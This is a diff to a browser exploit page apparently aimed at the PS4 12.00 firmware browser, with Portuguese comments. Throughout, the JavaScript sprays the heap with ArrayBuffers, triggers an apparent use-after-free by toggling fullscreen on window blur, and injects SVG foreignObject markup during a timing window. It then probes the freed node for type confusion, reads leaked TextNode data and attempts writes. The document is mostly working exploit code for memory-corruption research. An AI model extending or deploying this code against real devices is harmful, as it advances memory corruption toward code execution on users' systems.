@@ -2,29 +2,29 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF SVG Confusion Stage</title>
+<title>PS4 12.00 - UAF Leak Stage (TextNode)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → SVG foreignObject → Type Confusion</h2>
+<h2>UAF → Type Confusion → Leak Stage</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
 // ==========================
-// 🔒 SAFE LOG (alert)
+// 🔒 SAFE LOG
 let logBuffer = [];
-function log(msg) {
+function log(msg){
     try { console.log(msg); } catch(e){}
     logBuffer.push(msg);
 }
 
 // ==========================
 // HEAP SETUP
-function setupHeap() {
-    let arr = [];
+function setupHeap(){
+    let arr=[];
     for(let i=0;i<5000;i++){
-        let a = new Float64Array(8);
+        let a=new Float64Array(8);
         a[0]=i;
         arr.push(a);
     }
@@ -32,13 +32,13 @@ function setupHeap() {
 }
 
 // ==========================
-// FULLSCREEN (inalterado)
-function setupFullscreen() {
-    let fsTarget = document.createElement("div");
+// FULLSCREEN
+function setupFullscreen(){
+    let fsTarget=document.createElement("div");
 
-    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
 
-    Object.assign(fsTarget.style, {
+    Object.assign(fsTarget.style,{
         background:"black",
         width:"100%",
         height:"100%",
@@ -48,19 +48,18 @@ function setupFullscreen() {
     });
 
     document.body.appendChild(fsTarget);
-
     fsTarget.webkitRequestFullscreen?.();
 
     return fsTarget;
 }
 
 // ==========================
-// 💣 RECLAIM (ALINHADO)
+// 💣 RECLAIM (MAIS PRESSÃO)
 function reclaim(size){
     log("[*] Reclaim size = " + size);
 
     // churn
-    for(let i=0;i<2000;i++){
+    for(let i=0;i<3000;i++){
         let e=document.createElement("div");
         document.body.appendChild(e);
         e.remove();
@@ -73,39 +72,41 @@ function reclaim(size){
         document.body.appendChild(e);
     }
 
-    // 🔥 ArrayBuffer alinhado
+    // 🔥 ArrayBuffer spray (mais forte)
     let ab=[];
-    for(let i=0;i<8000;i++){
+    for(let i=0;i<12000;i++){
         let b=new ArrayBuffer(0x40);
         let v=new Uint8Array(b);
+
         v[0]=0x41;
-        v[1]=0x42;
-        v[2]=0x43;
-        v[3]=0x44;
+        v[1]=0x41;
+        v[2]=0x41;
+        v[3]=0x41;
+
         ab.push(v);
     }
 }
 
 // ==========================
-// 💥 SVG CONFUSION PAYLOAD
-function injectSVG(child){
+// 💥 SVG CONFUSION
+function inject(child){
     try{
         child.outerHTML = `
-        <svg id="pwn">
+        <svg>
             <foreignObject width="100%" height="100%">
-                <div xmlns="http://www.w3.org/1999/xhtml" id="inner">
+                <div xmlns="http://www.w3.org/1999/xhtml">
                     AAAA
                 </div>
             </foreignObject>
         </svg>`;
-        log("[*] SVG payload injected");
+        log("[*] payload injected");
     }catch(e){
-        log("[UAF] outerHTML crash");
+        log("[UAF] inject crash");
     }
 }
 
 // ==========================
-// 🔬 TYPE CONFUSION PROBE
+// 🔬 LEAK + WRITE PROBE
 function probe(fsTarget){
     log("---- PROBE ----");
 
@@ -115,38 +116,46 @@ function probe(fsTarget){
         log("[CHECK] node = " + n);
         if(!n) return;
 
-        log("[CHECK] tag = " + n.tagName);
         log("[CHECK] nodeType = " + n.nodeType);
 
-        // instanceof checks
-        try { log("[CHECK] HTMLElement = " + (n instanceof HTMLElement)); } catch(e){}
-        try { log("[CHECK] SVGElement = " + (n instanceof SVGElement)); } catch(e){}
+        // 🎯 FOCO: TextNode
+        if(n.nodeType === 3){
 
-        // 🔥 querySelector cross-namespace
-        let inner=null;
-        try{
-            inner = n.querySelector("#inner");
-            log("[CHECK] querySelector inner = " + inner);
-        }catch(e){
-            log("[UAF] querySelector crash");
-        }
+            log("[!!!] TEXTNODE DETECTADO");
 
-        // 🔥 inconsistência crítica
-        if(inner){
             try{
-                log("[CHECK] inner tag = " + inner.tagName);
+                let data = n.data;
 
-                inner.innerHTML = "BBBB";
-                log("[CHECK] inner write OK");
+                log("[LEAK] data = " + data);
+
+                // heurística de leak
+                if(data && (
+                    data.length > 20 ||
+                    data.includes("AAAA") ||
+                    data.includes("\u0000")
+                )){
+                    log("[!!!] POSSIVEL LEAK REAL");
+                }
 
             }catch(e){
-                log("[UAF] inner write crash");
+                log("[LEAK] crash leitura");
             }
+
+            // 💣 tentativa de write
+            try{
+                n.data = "BBBBBBBBBBBBBBBBBBBBBBBB";
+                log("[PWN] write data OK");
+            }catch(e){
+                log("[UAF] write crash");
+            }
+
         } else {
-            log("[!!!] INNER NÃO ENCONTRADO (INCONSISTENTE)");
+
+            log("[INFO] nao virou TextNode");
+
         }
 
-        // 🔥 layout engine touch
+        // 🔥 acesso genérico (pode crashar)
         try{
             let r = n.getBoundingClientRect();
             log("[CHECK] rect OK");
@@ -154,19 +163,9 @@ function probe(fsTarget){
             log("[UAF] rect crash");
         }
 
-        // 🔥 clone (muito sensível a UAF)
-        try{
-            let c = n.cloneNode(true);
-            log("[CHECK] clone OK: " + c);
-        }catch(e){
-            log("[UAF] clone crash");
-        }
-
     }catch(e){
         log("[UAF] probe crash geral");
     }
-
-    try { log("[CHECK] parent = " + fsTarget.parentNode); } catch(e){}
 }
 
 // ==========================
@@ -180,6 +179,7 @@ function trigger(fsTarget){
         if(document.webkitIsFullScreen || document.fullscreenElement){
             document.webkitExitFullscreen?.();
         }
+
     }catch(e){
         log("[ERRO]");
     }
@@ -190,20 +190,20 @@ function trigger(fsTarget){
         setTimeout(()=>reclaim(s), i*50);
     });
 
-    // 🔥 injeção no timing crítico
+    // janela crítica
     setTimeout(()=>{
         try{
             let child = fsTarget.firstChild;
-            if(child) injectSVG(child);
+            if(child) inject(child);
         }catch(e){}
     }, 30);
 
-    // probes múltiplos
+    // probes
     setTimeout(()=>probe(fsTarget), 80);
     setTimeout(()=>probe(fsTarget), 160);
     setTimeout(()=>probe(fsTarget), 240);
 
-    // log final
+    // dump
     setTimeout(()=>{
         alert(logBuffer.join("\n"));
     }, 400);
@@ -217,10 +217,10 @@ function trigger(fsTarget){
 function runTest(){
     log("[*] Iniciando teste");
 
-    let heap = setupHeap();
-    let fsTarget = setupFullscreen();
+    let heap=setupHeap();
+    let fsTarget=setupFullscreen();
 
-    window.onblur = function(){
+    window.onblur=function(){
         log("[*] onblur");
         setTimeout(()=>trigger(fsTarget), 3000);
     };
